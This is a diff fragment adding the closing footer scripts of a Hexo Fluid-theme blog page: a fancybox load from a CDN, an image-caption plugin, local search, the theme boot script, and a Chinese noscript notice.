+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
